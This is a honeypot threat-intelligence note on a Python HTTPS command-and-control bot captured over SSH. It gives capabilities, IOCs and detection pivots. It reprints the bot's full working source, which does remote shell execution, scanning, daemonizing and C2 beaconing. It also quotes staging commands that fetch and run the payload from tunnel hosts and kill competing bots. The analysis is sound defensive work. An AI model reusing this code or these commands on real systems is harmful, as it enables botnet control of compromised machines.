# Intel Note — "grimoireclub" Python HTTPS C2 bot (httpbot.py)

**Captured:** 2026-09 (Cowrie SSH sessions) · **Analyst:** Oak Atsume (DC801)
**Status:** reconstructed from session capture; **Graylog was down (cert error) at analysis time** — pivots below are queued for when it returns.

---

## Summary

An attacker pasted a Python bot into an SSH session as **base64 chunks appended to `/tmp/hb.b64`**, then decoded and ran it — so Cowrie captured the full source (`/tmp/query.txt`, rows 17–30). Reassembled and decoded below. It is a lightweight **Python HTTPS command-and-control bot / scanning worm**, notably stealthier than the usual Mirai shell-droppers: Python 2/3 compatible, HTTPS-to-domain C2, disposable tunnel infrastructure, and delivery that never touches `wget`/`curl` for the payload itself.

## Capabilities (`handle_command`)
- `exec` — arbitrary shell command (30s timeout, ≤4000 bytes returned)
- `scan` — built-in TCP port scanner, default ports `22,80,443,8080,8443,23,554` (**554/RTSP, 23/telnet** → self-propagation/recon)
- `info` — arch/OS report
- default — treats the command type itself as a shell command
- **Persistence/stealth:** `daemonize()` (double-fork + `setsid` + std→`/dev/null`); `BOT_ID = hostname-pid`; register → heartbeat loop every 30s.

## Delivery / staging TTP (rows 1–16, 31–40)
- Connectivity check to C2: `wget -q -O /dev/null http://c2.grimoireclub.rocks/` → `HTTP_OK`/`HTTP_FAIL`
- Evicts competitors: `killall -9 httpbot.py httpbot b.py bot.py`
- Recon: python/wget/curl version checks, `cat /proc/cpuinfo`, cron enumeration, `ps`
- **Payload staged as base64 chunks** → `python -c "base64.b64decode(...)"` → `/tmp/hb.py` → `setsid python /tmp/hb.py &` → `rm -f /tmp/hb.py /tmp/hb.b64`
- Fallback/alt delivery via **ephemeral tunnels**: `wget https://meditation-tune-about-fax.trycloudflare.com/httpbot.py`; tested `http://e826582c8e90eb.lhr.life/`

## Why it matters
1. **base64-over-SSH delivery** — no download tool used for the payload; evades network payload detection and works where egress is filtered.
2. **Ephemeral-tunnel infra** (`trycloudflare.com`, `lhr.life`) — disposable, hard to block/sinkhole, no fixed hosting.
3. **Established campaign** — the `killall` of prior `httpbot.py`/`bot.py` + cron/ps recon shows it's *updating an existing fleet*, not a first infection.

---

## IOCs

| Type | Value |
|---|---|
| C2 (domain) | `c2.grimoireclub.rocks` · parent `grimoireclub.rocks` |
| C2 scheme | `https://c2.grimoireclub.rocks/` (JSON POST) |
| Payload (CF tunnel) | `https://meditation-tune-about-fax.trycloudflare.com/httpbot.py` |
| Tunnel (localhost.run) | `e826582c8e90eb.lhr.life` |
| Dropped files | `/tmp/hb.py`, `/tmp/hb.b64` |
| Bot names (evicted) | `httpbot.py`, `httpbot`, `b.py`, `bot.py` |
| Stager IPs (DE) | `109.120.140.28`, `89.208.96.121` |
| Session cluster | `176.65.139.206` (LU), `109.160.32.23` (UK), `194.41.112.119` (DE), `195.178.110.26` (BG), `45.156.87.209` (NL) |

---

## Reconstructed source

> The first base64 chunk (imports + the `C2 = "…"` literal) was **not** in the captured rows; that header is inferred and marked. Everything from `PORT`/`HEARTBEAT` down is byte-exact from the decode. Kept as a **read-only captured sample** — do not execute.

```python
# --- header inferred (first base64 chunk not captured) ---
# import os, sys, time, json, socket, subprocess, platform
# try: import urllib2
# except ImportError: import urllib.request
# C2 = "c2.grimoireclub.rocks"        # confirmed by the session's own C2 checks
# PORT = 443                          # (line below is byte-exact)
# --------------------------------------------------------
  = 443
HEARTBEAT = 30

def daemonize():
    if os.fork() > 0: os._exit(0)
    os.setsid()
    if os.fork() > 0: os._exit(0)
    try:
        d = os.open(os.devnull, os.O_RDWR)
        os.dup2(d, 0); os.dup2(d, 1); os.dup2(d, 2)
        os.close(d)
    except: pass

BOT_ID = None

def gen_id():
    global BOT_ID
    try: h = platform.node()
    except: h = "?"
    BOT_ID = "%s-%d" % (h, os.getpid())

def http_post(msg):
    url = "https://%s/" % C2
    data = json.dumps(msg)
    try:
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        resp = urllib2.urlopen(req, timeout=10)
        return json.loads(resp.read())
    except:
        return None

def http_post_py3(msg):
    url = "https://%s/" % C2
    data = json.dumps(msg).encode()
    try:
        req = urllib.request.Request(url, data, {'Content-Type': 'application/json'})
        resp = urllib.request.urlopen(req, timeout=10)
        return json.loads(resp.read().decode())
    except:
        return None

def post(msg):
    try:
        return http_post(msg)
    except:
        try:
            return http_post_py3(msg)
        except:
            return None

def do_register():
    try: arch = platform.machine()
    except: arch = "?"
    return {"id": BOT_ID, "msg_type": "register", "payload": {"arch": arch, "os": "linux"}, "timestamp": int(time.time())}

def do_heartbeat():
    return {"id": BOT_ID, "msg_type": "heartbeat", "payload": {}, "timestamp": int(time.time())}

def exec_cmd(cmd):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = p.communicate(timeout=30)
        output = stdout + stderr
    except subprocess.TimeoutExpired:
        try: p.kill()
        except: pass
        output = b"TIMEOUT"
    except Exception as e:
        output = str(e).encode()
    if isinstance(output, bytes):
        output = output.decode(errors="ignore")
    return {"id": BOT_ID, "msg_type": "response", "payload": {"output": output[:4000]}, "timestamp": int(time.time())}

def handle_command(ct, payload):
    if ct == "exec":
        return exec_cmd(payload.get("cmd", ""))
    elif ct == "scan":
        target = payload.get("target", "")
        ports = payload.get("ports", [22, 80, 443, 8080, 8443, 23, 554])
        if isinstance(ports, str):
            ports = [int(p) for p in ports.split(",")]
        results = []
        for port in ports:
            try:
                s = socket.socket()
                s.settimeout(1)
                if s.connect_ex((target, port)) == 0:
                    results.append("%d/open" % port)
                s.close()
            except: pass
        return {"id": BOT_ID, "msg_type": "response", "payload": {"output": "SCAN: " + ", ".join(results)}, "timestamp": int(time.time())}
    elif ct == "info":
        return {"id": BOT_ID, "msg_type": "response", "payload": {"output": platform.machine() + " " + platform.system()}, "timestamp": int(time.time())}
    else:
        return exec_cmd(ct)

def main():
    gen_id()
    daemonize()

    while True:
        try:
            resp = post(do_register())
            if resp and resp.get("msg_type") == "registered":
                while True:
                    time.sleep(HEARTBEAT)
                    resp = post(do_heartbeat())
                    if not resp:
                        break
        except:
            pass
        time.sleep(10)

if __name__ == "__main__":
    main()
```

---

## Follow-up once Graylog is back (queued pivots)

Run over a wide window (90d+); Cowrie fields are `src_ip`, `input`, `eventid`, `session`.

1. **Campaign scope by C2 / infra** (full-text on command input):
   - `"grimoireclub"` — every session referencing the C2
   - `"trycloudflare.com"` and `"lhr.life"` — all ephemeral-tunnel delivery attempts (likely wider than this one bot)
   - `"hb.b64"` OR `"httpbot"` OR `"killall -9 httpbot"` — the staging/eviction signature
2. **base64-over-SSH staging pattern** generally: `input:printf AND input:"/tmp"` / `"b64decode"` — find other bots delivered this way.
3. **Stager attribution:** `src_ip:109.120.140.28 OR src_ip:89.208.96.121` — full command timeline, creds used (`cowrie.login.success` user/pass), JA4/hassh fingerprints → pivot to sibling IPs (same technique used for the Iranian relay in the Sept report: JA4 `t12d4312h1_…`).
4. **Which creds got them in:** `eventid:cowrie.login.success AND src_ip:(…)` — feed back into brute-cred stats.
5. **Scanner behavior after install:** any `cowrie.direct-tcpip.request` from the cluster (the bot's `scan` port list incl. 554/23).
6. **Passive OSINT** (as done before): WHOIS/DNS/crt.sh on `grimoireclub.rocks`, Shodan InternetDB on the stager IPs, resolve the current A record of the C2 (may rotate).

## Notes
- Only **decoded/read**, never executed.
- Working copy of the reconstructed source: session scratchpad `httpbot.py`.
- This is SSH-side (Cowrie) intel — not a web WAF gap. If desired, a Cowrie-input signature for the staging pattern (`printf … >> /tmp/*.b64` + `grimoireclub`/`trycloudflare`/`lhr.life`) would flag recurrences.
